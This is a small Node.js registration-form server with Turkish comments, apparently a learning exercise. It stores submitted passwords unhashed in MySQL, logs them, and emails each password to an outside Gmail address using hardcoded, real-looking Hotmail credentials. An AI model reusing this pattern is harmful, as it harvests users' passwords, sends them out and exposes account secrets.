var http = require('http'); //localhostta yayınlayacağım
var url = require('url'); // gelen url parse edip
var fs = require('fs'); //file system : dosya okuyacağım

var mysql =require("mysql");
var nodemailer = require('nodemailer');

var con = mysql.createConnection(
    {
        //veritabanına giriş için kimliğimiz
        host :"localhost", 
        user : "root",
        password :"" ,
        database: "nodedb"
    }
);


http.createServer(function(req,res){  //web site yayınlama (istek , cevap)

    fs.readFile('kayit.html', function(err,data){
 
        if(err){
            res.writeHead(404, {'Content-Type' : 'text/html'})
            return res.end("404 dosyaniz bulunamadi.");
        }

        res.writeHead(200, {'Content-Type': 'text/html'})
        res.write(data); //formu yazdırıyoruz.
        return res.end();

    });

    var bilgi = url.parse(req.url , true).query; //gelen bilgiyi alıp json obj dönüştürüyor.

    if(bilgi.username && bilgi.password){
        console.log(bilgi.username);
        console.log(bilgi.password);
            
        var sql ="INSERT INTO user(username,password) VALUES(?,?)";
        const values=[bilgi.username,bilgi.password];
        
            con.query(sql,values,function(err,result){ 
            if(err) throw err;
            console.log("Kayitlar oluşturuldu!");
    
        });

        var transporter = nodemailer.createTransport({
            service : 'Hotmail',
            auth : {
                user :"badem3444@hotmail.com",
                pass : 'Caglaymn123'
            }
        });
        
        let mailOption = {
            from : 'badem3444@hotmail.com',
            to : 'paksoyesma3461@gmail.com',
            subject : 'Kayit Bigileri',
            text : " 'Kayit ve Şifre bilgisi " +bilgi.password +" ."
        }
        
        //mail gonderimi
        
        transporter.sendMail(mailOption, function(err,info){
            if(err) throw err;
            else console.log("e-mail gönderildi!");
        })
    }


}).listen(8080);